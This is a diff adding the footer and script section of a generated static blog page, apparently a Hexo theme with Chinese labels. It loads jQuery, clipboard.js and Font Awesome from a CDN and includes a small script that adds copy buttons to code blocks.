+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
